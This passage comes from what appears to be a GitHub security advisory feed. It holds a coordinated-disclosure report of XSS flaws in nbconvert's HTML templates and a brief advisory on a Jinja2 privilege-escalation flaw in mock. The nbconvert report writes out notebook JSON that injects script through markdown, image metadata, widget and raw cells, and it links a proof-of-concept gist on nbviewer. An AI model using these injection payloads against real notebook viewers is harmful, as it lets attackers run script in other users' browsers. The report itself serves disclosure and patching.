<p>The <code>cell.output.data["text/markdown"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>{{ output.data['text/markdown'] | markdown2html }}
</code></pre>
<p>The following <code>cell.output.data["text/markdown"]</code> node will execute arbitrary javascript:</p>
<pre><code>    {
     "output_type": "execute_result",
     "data": {
      "text/markdown": ["&lt;script&gt;console.log(\"text/markdown output\")&lt;/script&gt;"]
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-9-xss-in-output-data-applicationjavascript-cellsghsl-2021-1021">Issue 9: XSS in output data application/javascript cells(<code>GHSL-2021-1021</code>)</h3>
<p>Using the <code>application/javascript</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The <code>cell.output.data["application/javascript"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping</p>
<pre><code>&lt;script type="text/javascript"&gt;
var element = document.getElementById('{{ div_id }}');
{{ output.data['application/javascript'] }}
&lt;/script&gt;
</code></pre>
<p>The following <code>cell.output.data["application/javascript"]</code> node will execute arbitrary javascript:</p>
<pre><code>    {
     "output_type": "execute_result",
     "data": {
      "application/javascript": ["console.log(\"application/javascript output\")"]
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-10-xss-is-outputmetadatafilenames-imagepng-and-imagejpegghsl-2021-1022">Issue 10: XSS is output.metadata.filenames image/png and image/jpeg(<code>GHSL-2021-1022</code>)</h3>
<p>The <code>cell.output.metadata.filenames["images/png"]</code> and <code>cell.metadata.filenames["images/jpeg"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{%- if 'image/png' in output.metadata.get('filenames', {}) %}
&lt;img src="{{ output.metadata.filenames['image/png'] | posix_path }}"
</code></pre>
<p>The following <code>filenames</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/png": [""]
     },
     "execution_count": null,
     "metadata": {
       "filenames": {
          "image/png": "\"&gt;&lt;script&gt;console.log(\"output.metadata.filenames.image/png injection\")&lt;/script&gt;" 
       }
     }
    }
</code></pre>
<h3 id="issue-11-xss-in-output-data-imagepng-and-imagejpeg-cellsghsl-2021-1023">Issue 11: XSS in output data image/png and image/jpeg cells(<code>GHSL-2021-1023</code>)</h3>
<p>Using the <code>image/png</code> or <code>image/jpeg</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. </p>
<p>The <code>cell.output.data["images/png"]</code> and <code>cell.output.data["images/jpeg"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{%- else %}
&lt;img src="data:image/png;base64,{{ output.data['image/png'] }}"
{%- endif %}
</code></pre>
<p>The following <code>cell.output.data["image/png"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/png": ["\"&gt;&lt;script&gt;console.log(\"image/png output\")&lt;/script&gt;"]
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-12-xss-is-outputmetadatawidthheight-imagepng-and-imagejpegghsl-2021-1024">Issue 12: XSS is output.metadata.width/height image/png and image/jpeg(<code>GHSL-2021-1024</code>)</h3>
<p>The <code>cell.output.metadata.width</code> and <code>cell.output.metadata.height</code> nodes of both <code>image/png</code> and <code>image/jpeg</code> cells are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{%- set width=output | get_metadata('width', 'image/png') -%}
width={{ width }}
{%- set height=output | get_metadata('height', 'image/png') -%}
height={{ height }}
</code></pre>
<p>The following <code>output.metadata.width</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "image/png": ["abcd"]
     },
     "execution_count": null,
     "metadata": {
        "width": "&gt;&lt;script&gt;console.log(\"output.metadata.width png injection\")&lt;/script&gt;"
     }
    }
</code></pre>
<h3 id="issue-13-xss-in-output-data-applicationvndjupyterwidget-statejson-cellsghsl-2021-1025">Issue 13: XSS in output data application/vnd.jupyter.widget-state+json cells(<code>GHSL-2021-1025</code>)</h3>
<p>The <code>cell.output.data["application/vnd.jupyter.widget-state+json"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{% set datatype_list = output.data | filter_data_type %}
{% set datatype = datatype_list[0]%}
&lt;script type="{{ datatype }}"&gt;
{{ output.data[datatype] | json_dumps }}
&lt;/script&gt;
</code></pre>
<p>The following <code>cell.output.data["application/vnd.jupyter.widget-state+json"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "application/vnd.jupyter.widget-state+json": "\"&lt;/script&gt;&lt;script&gt;console.log('output.data.application/vnd.jupyter.widget-state+json injection')//"
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-14-xss-in-output-data-applicationvndjupyterwidget-viewjson-cellsghsl-2021-1026">Issue 14: XSS in output data application/vnd.jupyter.widget-view+json cells(<code>GHSL-2021-1026</code>)</h3>
<p>The <code>cell.output.data["application/vnd.jupyter.widget-view+json"]</code> nodes are rendered directly to the <a href="https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2"><code>base.html.j2</code></a> HTML template with no escaping:</p>
<pre><code>{% set datatype_list = output.data | filter_data_type %}
{% set datatype = datatype_list[0]%}
&lt;script type="{{ datatype }}"&gt;
{{ output.data[datatype] | json_dumps }}
&lt;/script&gt;
</code></pre>
<p>The following <code>cell.output.data["application/vnd.jupyter.widget-view+json"]</code> node will execute arbitrary javascript:</p>
<pre><code class="language-json">    {
     "output_type": "execute_result",
     "data": {
      "application/vnd.jupyter.widget-view+json": "\"&lt;/script&gt;&lt;script&gt;console.log('output.data.application/vnd.jupyter.widget-view+json injection')//"
     },
     "execution_count": null,
     "metadata": {}
    }
</code></pre>
<h3 id="issue-15-xss-in-raw-cellsghsl-2021-1027">Issue 15: XSS in raw cells(<code>GHSL-2021-1027</code>)</h3>
<p>Using a <code>raw</code> cell type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The following is an example of a <code>raw</code> cell executing arbitrary javascript code:</p>
<pre><code class="language-json">  {
   "cell_type": "raw",
   "id": "372c2bf1",
   "metadata": {},
   "source": [
    "Payload in raw cell &lt;script&gt;alert(1)&lt;/script&gt;"
   ]
  }
</code></pre>
<h3 id="issue-16-xss-in-markdown-cellsghsl-2021-1028">Issue 16: XSS in markdown cells(<code>GHSL-2021-1028</code>)</h3>
<p>Using a <code>markdown</code> cell type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>
<p>The following is an example of a <code>markdown</code> cell executing arbitrary javascript code:</p>
<pre><code class="language-json">  {
   "cell_type": "markdown",
   "id": "2d42de4a",
   "metadata": {},
   "source": [
     "&lt;script&gt;alert(1)&lt;/script&gt;"
   ]
  },
</code></pre>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>These vulnerabilities may affect any server using nbconvert to generate HTML and not using a secure content-security-policy (CSP) policy. For example <a href="https://nbviewer.jupyter.org">nbviewer</a> is vulnerable to the above mentioned XSS issues:</p>
<ol>
<li>Create Gist with payload. eg:</li>
</ol>
<ul>
<li><code>https://gist.github.com/pwntester/ff027d91955369b85f99bb1768b7f02c</code></li>
</ul>
<ol start="2">
<li>Then load gist on nbviewer. eg:</li>
</ol>
<ul>
<li><code>https://nbviewer.jupyter.org/gist/pwntester/ff027d91955369b85f99bb1768b7f02c</code></li>
</ul>
<p>Note: response is served with <code>content-security-policy: connect-src 'none';</code></p>
<h2 id="github-security-advisories">GitHub Security Advisories</h2>
<p>We recommend you create a private <a href="https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory">GitHub Security Advisory</a> for these findings. This also allows you to invite the GHSL team to collaborate and further discuss these findings in private before they are <a href="https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory">published</a>.</p>
<h2 id="credit">Credit</h2>
<p>These issues were discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>
<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2021-1013</code>, <code>GHSL-2021-1014</code>, <code>GHSL-2021-1015</code>, <code>GHSL-2021-1016</code>, <code>GHSL-2021-1017</code>, <code>GHSL-2021-1018</code>, <code>GHSL-2021-1019</code>, <code>GHSL-2021-1020</code>, <code>GHSL-2021-1021</code>, <code>GHSL-2021-1022</code>, <code>GHSL-2021-1023</code>, <code>GHSL-2021-1024</code>, <code>GHSL-2021-1025</code>, <code>GHSL-2021-1026</code>, <code>GHSL-2021-1027</code> or <code>GHSL-2021-1028</code> in any communication regarding these issues.</p>
<h2 id="disclosure-policy">Disclosure Policy</h2>
<p>This report is subject to our <a href="https://securitylab.github.com/advisories#policy">coordinated disclosure policy</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jupyter/nbconvert/security/advisories/GHSA-9jmq-rx5f-8jwq">https://github.com/jupyter/nbconvert/security/advisories/GHSA-9jmq-rx5f-8jwq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-32862">https://nvd.nist.gov/vuln/detail/CVE-2021-32862</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nbconvert/PYSEC-2022-249.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nbconvert/PYSEC-2022-249.yaml</a></li>
<li><a href="https://github.com/jupyter/nbviewer/security/advisories/GHSA-h274-fcvj-h2wm">https://github.com/jupyter/nbviewer/security/advisories/GHSA-h274-fcvj-h2wm</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2023/06/msg00003.html">https://lists.debian.org/debian-lts-announce/2023/06/msg00003.html</a></li>
<li><a href="https://github.com/advisories/GHSA-9jmq-rx5f-8jwq">https://github.com/advisories/GHSA-9jmq-rx5f-8jwq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9jmq-rx5f-8jwq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-10T17:51:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[templated_dictionary] Privilege escalation for users that can access mock configuration]]></title>
        <id>https://github.com/advisories/GHSA-7j98-74jh-cjxh</id>
        <link href="https://github.com/advisories/GHSA-7j98-74jh-cjxh"/>
        <updated>2024-01-30T06:30:23.000Z</updated>
        <content type="html"><![CDATA[<p>The Mock software contains a vulnerability wherein an attacker could potentially exploit privilege escalation, enabling the execution of arbitrary code with root user privileges. This weakness stems from the absence of proper sandboxing during the expansion and execution of Jinja2 templates, which may be included in certain configuration parameters. While the Mock documentation advises treating users added to the mock group as privileged, certain build systems invoking mock on behalf of users might inadvertently permit less privileged users to define configuration tags. These tags could then be passed as parameters to mock during execution, potentially leading to the utilization of Jinja2 templates for remote privilege escalation and the execution of arbitrary code as the root user on the build server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6395">https://nvd.nist.gov/vuln/detail/CVE-2023-6395</a></li>
<li><a href="https://github.com/xsuchy/templated-dictionary/commit/0740bd0ca8d487301881541028977d120f8b8933">https://github.com/xsuchy/templated-dictionary/commit/0740bd0ca8d487301881541028977d120f8b8933</a></li>
<li><a href="https://github.com/xsuchy/templated-dictionary/commit/bcd90f0dafa365575c4b101e6f5d98c4ef4e4b69">https://github.com/xsuchy/templated-dictionary/commit/bcd90f0dafa365575c4b101e6f5d98c4ef4e4b69</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2023-6395">https://access.redhat.com/security/cve/CVE-2023-6395</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2252206">https://bugzilla.redhat.com/show_bug.cgi?id=2252206</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/01/16/1">http://www.openwall.com/lists/oss-security/2024/01/16/1</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/01/16/3">http://www.openwall.com/lists/oss-security/2024/01/16/3</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NBFYREAJH4T7GXXQZ4GJEREN4Q3AHS3K/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NBFYREAJH4T7GXXQZ4GJEREN4Q3AHS3K/</a></li>
<li><a href="https://github.com/advisories/GHSA-7j98-74jh-cjxh">https://github.com/advisories/GHSA-7j98-74jh-cjxh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7j98-74jh-cjxh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-16T15:30:28.000Z</published>
    </entry>
</feed>